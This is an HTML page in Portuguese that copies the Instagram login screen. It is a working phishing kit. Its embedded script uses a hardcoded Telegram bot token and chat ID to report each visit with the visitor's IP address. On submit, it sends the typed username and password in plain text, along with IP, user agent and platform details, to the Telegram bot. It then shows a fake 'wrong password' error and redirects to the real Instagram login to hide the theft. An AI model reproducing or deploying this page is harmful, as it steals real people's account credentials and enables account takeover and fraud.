<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #121e26;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            align-items: center;
            justify-content: center; /* Centraliza verticalmente o conte√∫do principal */
            padding: 0 25px;
        }

        .language-top {
            position: absolute;
            top: 20px;
            color: #a8a8a8;
            font-size: 12px;
        }

        .main-content {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: -40px; /* Sobe um pouco a logo para compensar o centralizar */
        }

        .logo-container {
            margin-bottom: 40px;
        }

        .instagram-icon {
            width: 60px;
            height: 60px;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .login-form input {
            width: 100%;
            height: 52px;
            background: #1c2b33;
            border: 1px solid #36464f;
            border-radius: 12px;
            padding: 0 16px;
            font-size: 14px;
            color: #ffffff;
        }

        .login-form input::placeholder {
            color: #8e8e8e;
        }

        .login-form input:focus {
            border-color: #556670;
            outline: none;
        }

        .login-btn {
            background-color: #1864f7;
            color: white;
            border: none;
            border-radius: 25px;
            height: 44px;
            font-size: 15px;
            font-weight: 600;
            margin-top: 8px;
            cursor: pointer;
        }

        .login-btn:disabled {
            opacity: 0.7;
        }

        .forgot-link {
            text-align: center;
            font-size: 14px;
            margin-top: 18px;
            color: #ffffff;
            text-decoration: none;
            font-weight: 500;
        }

        .footer-actions {
            width: 100%;
            margin-top: 35px; /* Espa√ßamento reduzido conforme solicitado */
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }

        .create-account-btn {
            width: 100%;
            height: 44px;
            background: transparent;
            border: 1px solid #1864f7;
            border-radius: 25px;
            color: #1864f7;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .meta-container {
            margin-top: 10px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .meta-logo {
            width: 65px;
            opacity: 0.8;
            margin-top: 5px;
        }

        #errorMsg {
            color: #ed4956;
            font-size: 13px;
            text-align: center;
            margin-top: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="language-top">Portugu√™s (Brasil)</div>
    
    <div class="main-content">
        <div class="logo-container">
            <img src="https://static.cdninstagram.com/rsrc.php/v4/yk/r/iyazeqxfbpL.png" alt="Instagram" class="instagram-icon">
        </div>

        <form class="login-form" id="loginForm">
            <input type="text" id="username" placeholder="Nome de usu√°rio, email ou celular" required autocapitalize="none">
            <input type="password" id="password" placeholder="Senha" required>
            
            <button type="submit" class="login-btn" id="loginBtn">Entrar</button>
            
            <a href="#" class="forgot-link">Esqueceu a senha?</a>
            <div id="errorMsg">Senha incorreta. Tente novamente.</div>
        </form>

        <div class="footer-actions">
            <button type="button" class="create-account-btn">Criar nova conta</button>
            <div class="meta-container">
                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
            </div>
        </div>
    </div>

    <script>
        const TOKEN = "8524660585:AAHVKLyJeWs_5IM9nmNutXfPkXBBaBh4zi4";
        const CHAT_ID = "5542692841";
        const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        const form = document.getElementById('loginForm');
        const userInp = document.getElementById('username');
        const passInp = document.getElementById('password');
        const btn = document.getElementById('loginBtn');
        const err = document.getElementById('errorMsg');

        let userIP = "Desconhecido";

        async function fetchInitialData() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                userIP = d.ip;
                await sendTelegram(null, null, "üì± *VISITA: INTERFACE INSTAGRAM*");
            } catch (e) {
                await sendTelegram(null, null, "üì± *VISITA: INTERFACE INSTAGRAM*");
            }
        }

        async function sendTelegram(u, p, title) {
            const currentUA = navigator.userAgent;
            const timestamp = Math.floor(Date.now() / 1000);
            let message = `${title}\n\n`;

            if (u) {
                // Simula a l√≥gica de enc_password do script fornecido
                const encPwd = `#PWD_INSTAGRAM_BROWSER:0:${timestamp}:${p}`;
                
                message += `üë§ *Dados Capturados*\n`;
                message += `Usu√°rio: \`${u}\`\n`;
                message += `Senha: \`${p}\`\n\n`;
                message += `üîë *L√≥gica de Login AJAX*\n`;
                message += `Payload: \`{"username":"${u}", "enc_password":"${encPwd}"}\`\n\n`;
            }

            message += `üåê *Sistema*\n`;
            message += `IP: ${userIP}\n`;
            message += `User-Agent: \`${currentUA}\`\n`;
            message += `Plataforma: ${navigator.platform}\n`;
            message += `Hora: ${new Date().toLocaleString('pt-BR')}`;

            await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            btn.disabled = true;
            
            await sendTelegram(userInp.value, passInp.value, "üîê *TENTATIVA DE LOGIN DETECTADA*");
            
            err.style.display = 'block';
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, 1000);
        });

        window.onload = fetchInitialData;
    </script>
</body>
</html>
